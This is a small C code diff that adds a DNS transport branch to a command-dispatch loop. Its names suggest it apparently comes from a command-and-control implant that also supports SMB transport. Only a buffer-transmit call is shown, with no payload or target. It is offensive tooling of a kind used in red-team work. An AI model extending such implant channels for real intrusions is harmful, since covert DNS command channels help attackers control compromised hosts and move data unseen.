@@ -107,6 +107,15 @@ VOID CommandDispatcher( VOID )
             continue;
         }
 
+/* DNS */
+#elif defined(TRANSPORT_DNS)
+        if ( ! PackageTransmitAll( &DataBuffer, &DataBufferSize ) )
+        {
+            DataBuffer     = NULL;
+            DataBufferSize = 0;
+            continue;
+        }
+
 /* SMB */
 #else
         // send all the packages we might have
